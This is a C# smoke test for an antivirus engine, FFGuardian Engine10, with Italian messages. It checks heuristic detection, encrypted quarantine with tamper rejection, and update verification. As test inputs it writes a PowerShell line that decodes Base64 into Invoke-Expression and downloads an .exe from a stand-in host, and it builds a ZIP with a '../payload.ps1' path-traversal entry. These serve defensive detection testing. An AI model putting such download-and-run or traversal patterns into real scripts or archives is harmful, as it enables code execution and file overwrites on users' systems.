using System.IO.Compression;
using System.Security.Cryptography;
using FFGuardian;
using FFGuardian.Engine10;

internal static class Program
{
    private static async Task<int> Main()
    {
        string root = Path.Combine(Path.GetTempPath(), "FFGuardian-Engine10-Smoke-" + Guid.NewGuid().ToString("N"));
        string quarantineRoot = Path.Combine(root, "quarantine");
        string rollbackRoot = Path.Combine(root, "rollback");
        Directory.CreateDirectory(root);

        try
        {
            string databasePath = Path.Combine(root, "signatures.json");
            using RSA rsa = RSA.Create();
            rsa.KeySize = 2048;
            string publicKey = rsa.ExportSubjectPublicKeyInfoPem();
            using FFGuardianEngine10 engine = new(databasePath, publicKey, quarantineRoot, rollbackRoot);

            Ensure(!string.IsNullOrWhiteSpace(engine.SignatureDatabaseVersion), "Versione database firme non disponibile.");
            Ensure(engine.SecureUpdatesConfigured, "Aggiornamenti sicuri non configurati.");

            string unknownFile = Path.Combine(root, "document.txt");
            await File.WriteAllTextAsync(unknownFile, "FF Guardian harmless smoke test");
            FileScanResult10 unknownResult = await engine.ScanFileAsync(unknownFile);
            Ensure(unknownResult.Verdict is ThreatVerdict10.Unknown or ThreatVerdict10.Clean,
                "Un file innocuo non deve essere classificato come minaccia.");
            Ensure(unknownResult.Sha256.Length == 64, "SHA-256 non calcolato correttamente.");

            AuthenticodeResult100 missingSignature = engine.VerifyAuthenticode(Path.Combine(root, "missing.exe"));
            Ensure(!missingSignature.IsTrusted, "Un file inesistente non può risultare attendibile.");

            string suspiciousFile = Path.Combine(root, "invoice.pdf.exe");
            byte[] suspiciousBytes = RandomNumberGenerator.GetBytes(4096);
            await File.WriteAllBytesAsync(suspiciousFile, suspiciousBytes);
            FileScanResult10 suspiciousResult = await engine.ScanFileAsync(suspiciousFile);
            Ensure(suspiciousResult.Verdict == ThreatVerdict10.Suspicious,
                $"Il file di prova doveva essere sospetto, risultato: {suspiciousResult.Verdict}.");

            string suspiciousScript = Path.Combine(root, "update.ps1");
            await File.WriteAllTextAsync(
                suspiciousScript,
                "$x='a'; Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))); " +
                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
            FileScanResult10 scriptResult = await engine.ScanFileAsync(suspiciousScript);
            Ensure(scriptResult.Verdict == ThreatVerdict10.Suspicious,
                $"Lo script artificiale doveva essere sospetto, risultato: {scriptResult.Verdict}.");
            Ensure(scriptResult.DetectionName == "Heuristic.Suspicious.Script",
                "Lo script sospetto non ha ricevuto la classificazione prevista.");

            string harmlessZip = Path.Combine(root, "documents.zip");
            using (ZipArchive archive = ZipFile.Open(harmlessZip, ZipArchiveMode.Create))
            {
                ZipArchiveEntry entry = archive.CreateEntry("readme.txt");
                await using StreamWriter writer = new(entry.Open());
                await writer.WriteAsync("Archivio innocuo per test FF Guardian");
            }
            FileScanResult10 harmlessZipResult = await engine.ScanFileAsync(harmlessZip);
            Ensure(harmlessZipResult.Verdict == ThreatVerdict10.Unknown,
                "Un archivio ZIP innocuo non deve essere classificato come minaccia.");

            string suspiciousZip = Path.Combine(root, "suspicious.zip");
            using (ZipArchive archive = ZipFile.Open(suspiciousZip, ZipArchiveMode.Create))
            {
                ZipArchiveEntry entry = archive.CreateEntry("../payload.ps1");
                await using StreamWriter writer = new(entry.Open());
                await writer.WriteAsync("Write-Output 'test only'");
            }
            FileScanResult10 suspiciousZipResult = await engine.ScanFileAsync(suspiciousZip);
            Ensure(suspiciousZipResult.Verdict == ThreatVerdict10.Suspicious,
                $"Lo ZIP artificiale doveva essere sospetto, risultato: {suspiciousZipResult.Verdict}.");
            Ensure(suspiciousZipResult.DetectionName == "Heuristic.Suspicious.Archive",
                "L'archivio sospetto non ha ricevuto la classificazione prevista.");

            FolderScanSummary10 folderResult = await engine.ScanFolderAsync(root);
            Ensure(folderResult.FilesScanned >= 4, "La scansione cartella non ha analizzato tutti i tipi avanzati previsti.");
            Ensure(folderResult.SuspiciousFiles >= 3, "La scansione cartella non ha riportato i contenuti sospetti previsti.");

            AuditFinding10 finding = new(
                "SMOKE-QUARANTINE",
                "File",
                Path.GetFileName(suspiciousFile),
                suspiciousFile,
                AuditSeverity10.High,
                70,
                "File artificiale di prova con doppia estensione in cartella temporanea.",
                suspiciousResult.Sha256,
                "Firma digitale assente",
                true);

            RemediationPlan10 plan = engine.CreateQuarantinePlan(finding);
            QuarantineRecord10 record = await engine.ExecuteQuarantineAsync(plan, suspiciousResult, confirmed: true);
            Ensure(!File.Exists(suspiciousFile), "Il file originale non è stato rimosso dopo la quarantena verificata.");
            Ensure(File.Exists(record.StoredPath), "Il contenitore della quarantena non esiste.");
            Ensure(record.StoredPath.EndsWith(".ffgq", StringComparison.OrdinalIgnoreCase),
                "Il contenuto non usa il formato cifrato FF Guardian previsto.");
            Ensure(record.StoredPath.StartsWith(quarantineRoot, StringComparison.OrdinalIgnoreCase),
                "La quarantena non usa la cartella isolata del test.");

            byte[] encryptedBytes = await File.ReadAllBytesAsync(record.StoredPath);
            Ensure(!encryptedBytes.AsSpan().SequenceEqual(suspiciousBytes),
                "Il contenuto in quarantena coincide con il file in chiaro.");

            await engine.RestoreQuarantineAsync(record.Id);
            Ensure(File.Exists(suspiciousFile), "Il ripristino dalla quarantena non è riuscito.");
            byte[] restoredBytes = await File.ReadAllBytesAsync(suspiciousFile);
            Ensure(restoredBytes.AsSpan().SequenceEqual(suspiciousBytes),
                "Il file ripristinato non coincide con l'originale.");
            string restoredHash = Convert.ToHexString(SHA256.HashData(restoredBytes));
            Ensure(string.Equals(restoredHash, suspiciousResult.Sha256, StringComparison.OrdinalIgnoreCase),
                "Lo SHA-256 del file ripristinato non coincide con quello della scansione.");

            string tamperFile = Path.Combine(root, "tamper.pdf.exe");
            await File.WriteAllBytesAsync(tamperFile, RandomNumberGenerator.GetBytes(4096));
            FileScanResult10 tamperScan = await engine.ScanFileAsync(tamperFile);
            AuditFinding10 tamperFinding = finding with
            {
                Id = "SMOKE-QUARANTINE-TAMPER",
                Name = Path.GetFileName(tamperFile),
                Target = tamperFile,
                Sha256 = tamperScan.Sha256
            };
            RemediationPlan10 tamperPlan = engine.CreateQuarantinePlan(tamperFinding);
            QuarantineRecord10 tamperRecord = await engine.ExecuteQuarantineAsync(tamperPlan, tamperScan, confirmed: true);
            await using (FileStream tamperStream = new(tamperRecord.StoredPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
            {
                tamperStream.Position = Math.Min(32, tamperStream.Length - 1);
                int original = tamperStream.ReadByte();
                tamperStream.Position--;
                tamperStream.WriteByte((byte)(original ^ 0x5A));
            }

            bool tamperRejected = false;
            try
            {
                await engine.RestoreQuarantineAsync(tamperRecord.Id);
            }
            catch (InvalidDataException)
            {
                tamperRejected = true;
            }
            Ensure(tamperRejected, "Un contenitore di quarantena manomesso non è stato rifiutato.");
            Ensure(!File.Exists(tamperFile), "Un file manomesso non deve essere ripristinato.");

            UpdateManifest10 invalidManifest = new(
                "10.0.2",
                "stable",
                "missing-package.exe",
                new string('0', 64),
                1,
                "10.0.1",
                Convert.ToBase64String(new byte[] { 1, 2, 3 }));
            UpdateVerificationResult10 updateResult = await engine.VerifyUpdateAsync(
                invalidManifest,
                Path.Combine(root, "missing-package.exe"));
            Ensure(!updateResult.IsValid, "Un pacchetto inesistente non può essere valido.");

            Console.WriteLine("FFGuardian.Engine10 smoke tests: PASSED");
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("FFGuardian.Engine10 smoke tests: FAILED");
            Console.Error.WriteLine(ex);
            return 1;
        }
        finally
        {
            try
            {
                if (Directory.Exists(root))
                    Directory.Delete(root, recursive: true);
            }
            catch
            {
                // La pulizia dei file temporanei non deve nascondere il risultato dei test.
            }
        }
    }

    private static void Ensure(bool condition, string message)
    {
        if (!condition)
            throw new InvalidOperationException(message);
    }
}
